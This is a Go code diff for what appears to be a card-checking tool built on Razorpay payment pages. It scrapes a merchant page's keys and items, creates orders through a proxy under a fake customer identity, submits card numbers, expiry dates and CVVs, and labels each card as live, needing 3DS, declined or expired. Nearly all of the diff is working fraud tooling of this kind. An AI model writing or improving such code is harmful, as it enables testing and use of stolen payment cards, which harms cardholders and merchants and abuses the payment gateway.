@@ -26,22 +26,24 @@ type RazorpayAPIResponse struct {
 	Proxy    string `json:"Proxy"`
 }
 
-type RazorpayPaymentResult struct {
+type PaymentResult struct {
 	Status   string `json:"status"`
 	Response string `json:"response"`
 	Message  string `json:"message"`
 }
 
 type RazorpaySession struct {
-	Client        *http.Client
-	PageURL       string
-	KeylessHeader string
-	KeyID         string
-	PaymentLinkID string
-	ItemID        string
-	ItemAmount    int // native paise
-	Currency      string
-	IsMinAmount   bool
+	Client         *http.Client
+	ProxyURL       string
+	PageURL        string
+	KeyID          string
+	PageID         string
+	Currency       string
+	ItemID         string
+	ItemAmount     int // amount in paise
+	CustomAmount   int // amount in INR
+	MandatoryItems []map[string]any
+	KeylessHeader  string
 }
 
 func buildRazorpayHTTPClient(proxyURL string) (*http.Client, error) {
@@ -83,7 +85,6 @@ func (s *RazorpaySession) ScrapePage() error {
 		return err
 	}
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 
 	resp, err := s.Client.Do(req)
 	if err != nil {
@@ -91,86 +92,146 @@ func (s *RazorpaySession) ScrapePage() error {
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("payment page returned HTTP %d", resp.StatusCode)
-	}
-
 	bodyBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return fmt.Errorf("failed to read response body: %w", err)
+		return fmt.Errorf("failed to read body: %w", err)
 	}
 	html := string(bodyBytes)
 
-	reHeader := regexp.MustCompile(`(?i)keyless_header\s*:\s*"([^"]+)"`)
-	if match := reHeader.FindStringSubmatch(html); len(match) > 1 {
-		s.KeylessHeader = match[1]
+	re := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
+	match := re.FindStringSubmatch(html)
+	if len(match) < 2 {
+		return fmt.Errorf("could not find data block in page HTML")
 	}
 
-	reData := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
-	matchData := reData.FindStringSubmatch(html)
-	if len(matchData) < 2 {
-		return fmt.Errorf("payment page data JSON structure not found")
+	var parsed map[string]any
+	if err := json.Unmarshal([]byte(match[1]), &parsed); err != nil {
+		return fmt.Errorf("failed to parse page JSON: %w", err)
 	}
 
-	var data map[string]any
-	if err := json.Unmarshal([]byte(matchData[1]), &data); err != nil {
-		return fmt.Errorf("failed to parse page data JSON: %w", err)
+	keyID, _ := parsed["key_id"].(string)
+	if keyID == "" {
+		return fmt.Errorf("key_id not found in page data")
+	}
+	s.KeyID = keyID
+
+	keylessRe := regexp.MustCompile(`(?i)keyless_header\s*:\s*"([^"]+)"`)
+	if keylessMatch := keylessRe.FindStringSubmatch(html); len(keylessMatch) > 1 {
+		s.KeylessHeader = keylessMatch[1]
+	} else if keylessVal, ok := parsed["keyless_header"].(string); ok {
+		s.KeylessHeader = keylessVal
 	}
 
-	s.KeyID, _ = data["key_id"].(string)
-
-	pl, ok := data["payment_link"].(map[string]any)
-	if !ok {
-		return fmt.Errorf("payment_link object missing in page data")
+	paymentLink, _ := parsed["payment_link"].(map[string]any)
+	if paymentLink == nil {
+		return fmt.Errorf("payment_link metadata not found")
 	}
 
-	s.PaymentLinkID, _ = pl["id"].(string)
-	if curr, ok := pl["currency"].(string); ok && curr != "" {
-		s.Currency = curr
+	pageID, _ := paymentLink["id"].(string)
+	if pageID == "" {
+		return fmt.Errorf("payment page ID not found")
+	}
+	s.PageID = pageID
+
+	currency, _ := paymentLink["currency"].(string)
+	if currency == "" {
+		currency = "INR"
+	}
+	s.Currency = currency
+
+	var globalMin int
+	if val, ok := paymentLink["min_amount_value"].(float64); ok && val > 0 {
+		globalMin = int(val)
+	} else if val, ok := parsed["min_amount_value"].(float64); ok && val > 0 {
+		globalMin = int(val)
 	}
 
-	items, ok := pl["payment_page_items"].([]any)
-	if !ok || len(items) == 0 {
-		return fmt.Errorf("no items found on payment page")
+	items, _ := paymentLink["payment_page_items"].([]any)
+	for _, it := range items {
+		itemMap, ok := it.(map[string]any)
+		if !ok {
+			continue
+		}
+		id, _ := itemMap["id"].(string)
+
+		var mandatory bool
+		if mandVal, ok := itemMap["mandatory"].(bool); ok {
+			mandatory = mandVal
+		} else if mandValStr, ok := itemMap["mandatory"].(string); ok {
+			mandatory = strings.EqualFold(mandValStr, "true") || mandValStr == "1"
+		}
+
+		itemDetail, _ := itemMap["item"].(map[string]any)
+		var unitAmt float64
+		if itemDetail != nil {
+			if val, ok := itemDetail["amount"].(float64); ok && val > 0 {
+				unitAmt = val
+			} else if val, ok := itemDetail["unit_amount"].(float64); ok && val > 0 {
+				unitAmt = val
+			} else if valStr, ok := itemDetail["amount"].(string); ok {
+				unitAmt, _ = strconv.ParseFloat(valStr, 64)
+			} else if valStr, ok := itemDetail["unit_amount"].(string); ok {
+				unitAmt, _ = strconv.ParseFloat(valStr, 64)
+			}
+		}
+
+		if unitAmt == 0 {
+			if val, ok := itemDetail["min_amount"].(float64); ok && val > 0 {
+				unitAmt = val
+			} else if val, ok := itemMap["min_amount"].(float64); ok && val > 0 {
+				unitAmt = val
+			}
+		}
+
+		itemAmountInt := int(unitAmt)
+		if itemAmountInt < globalMin {
+			itemAmountInt = globalMin
+		}
+
+		if mandatory || s.ItemID == "" {
+			if s.ItemID == "" {
+				s.ItemID = id
+				s.ItemAmount = itemAmountInt
+			}
+			if mandatory {
+				s.MandatoryItems = append(s.MandatoryItems, map[string]any{
+					"payment_page_item_id": id,
+					"amount":               itemAmountInt,
+				})
+			}
+		}
 	}
 
-	firstItem, _ := items[0].(map[string]any)
-	s.ItemID, _ = firstItem["id"].(string)
-
-	amountVal := 0
-	if amt, ok := firstItem["amount"].(float64); ok && amt > 0 {
-		amountVal = int(amt)
-	} else if uAmt, ok := firstItem["unit_amount"].(float64); ok && uAmt > 0 {
-		amountVal = int(uAmt)
-	} else if minAmt, ok := firstItem["min_amount"].(float64); ok && minAmt > 0 {
-		amountVal = int(minAmt)
-		s.IsMinAmount = true
-	} else if minAmtVal, ok := firstItem["min_amount_value"].(float64); ok && minAmtVal > 0 {
-		amountVal = int(minAmtVal)
-		s.IsMinAmount = true
-	}
-
-	if amountVal <= 0 {
-		amountVal = 100
-	}
-	s.ItemAmount = amountVal
-
-	if s.KeyID == "" || s.PaymentLinkID == "" {
-		return fmt.Errorf("key_id or payment_link_id missing in page data")
+	if s.ItemAmount == 0 && len(s.MandatoryItems) == 0 {
+		if s.CustomAmount <= 0 {
+			s.CustomAmount = 100
+		}
+		s.ItemAmount = s.CustomAmount * 100
+		if s.ItemAmount < globalMin {
+			s.ItemAmount = globalMin
+		}
+		s.MandatoryItems = append(s.MandatoryItems, map[string]any{
+			"payment_page_item_id": s.ItemID,
+			"amount":               s.ItemAmount,
+		})
+	} else if len(s.MandatoryItems) > 0 {
+		total := 0
+		for _, item := range s.MandatoryItems {
+			if amt, ok := item["amount"].(int); ok {
+				total += amt
+			}
+		}
+		s.ItemAmount = total
 	}
 
 	return nil
 }
 
-func (s *RazorpaySession) CreateOrder(customAmountINR int, name, email, phone string) (string, error) {
-	targetURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PaymentLinkID)
+func (s *RazorpaySession) CreateOrder(name, email, phone string) (string, error) {
+	targetURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PageID)
 
-	if customAmountINR > 0 {
-		s.ItemAmount = customAmountINR * 100
-	}
-
-	var lineItems []map[string]any
-	if s.ItemID != "" {
+	lineItems := s.MandatoryItems
+	if len(lineItems) == 0 {
 		lineItems = []map[string]any{
 			{
 				"payment_page_item_id": s.ItemID,
@@ -239,7 +300,7 @@ func (s *RazorpaySession) CreateOrder(customAmountINR int, name, email, phone st
 	return orderID, nil
 }
 
-func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*RazorpayPaymentResult, error) {
+func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*PaymentResult, error) {
 	targetURL := "https://api.razorpay.com/v1/payments"
 
 	payload := map[string]any{
@@ -377,7 +438,7 @@ func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, em
 				responseCode = "EXPIRED_CARD"
 			}
 
-			return &RazorpayPaymentResult{
+			return &PaymentResult{
 				Status:   statusText,
 				Response: responseCode,
 				Message:  desc,
@@ -385,7 +446,7 @@ func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, em
 		}
 
 		if parsed["callback_url"] != nil || parsed["next"] != nil || parsed["action"] != nil {
-			return &RazorpayPaymentResult{
+			return &PaymentResult{
 				Status:   "3ds",
 				Response: "3DS_REQUIRED",
 				Message:  "Card verification (OTP/3DS) is required by the bank",
@@ -394,7 +455,7 @@ func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, em
 
 		status, _ := parsed["status"].(string)
 		if status == "captured" || status == "authorized" {
-			return &RazorpayPaymentResult{
+			return &PaymentResult{
 				Status:   "success",
 				Response: "SUCCESS",
 				Message:  "Payment authorized successfully",
@@ -402,7 +463,7 @@ func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, em
 		}
 
 		if status != "" {
-			return &RazorpayPaymentResult{
+			return &PaymentResult{
 				Status:   "fail",
 				Response: "CARD_DECLINED",
 				Message:  fmt.Sprintf("Payment status: %s", status),
@@ -410,7 +471,7 @@ func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, em
 		}
 	}
 
-	return &RazorpayPaymentResult{
+	return &PaymentResult{
 		Status:   "fail",
 		Response: "GATEWAY_ERROR",
 		Message:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBytes)),
@@ -432,7 +493,7 @@ func handleRazorpayAPI(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	customAmount := 0
+	customAmount := 10
 	if amountStr != "" {
 		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
 			customAmount = val
@@ -464,6 +525,7 @@ func handleRazorpayAPI(w http.ResponseWriter, r *http.Request) {
 	}
 
 	session := NewRazorpaySession(client, siteURL)
+	session.CustomAmount = customAmount
 
 	if err := session.ScrapePage(); err != nil {
 		resp := RazorpayAPIResponse{
@@ -480,7 +542,7 @@ func handleRazorpayAPI(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	orderID, err := session.CreateOrder(customAmount, "Jane Doe", "janedoe@example.com", "+919876543210")
+	orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "+919876543210")
 	if err != nil {
 		resp := RazorpayAPIResponse{
 			CC:       ccLine,
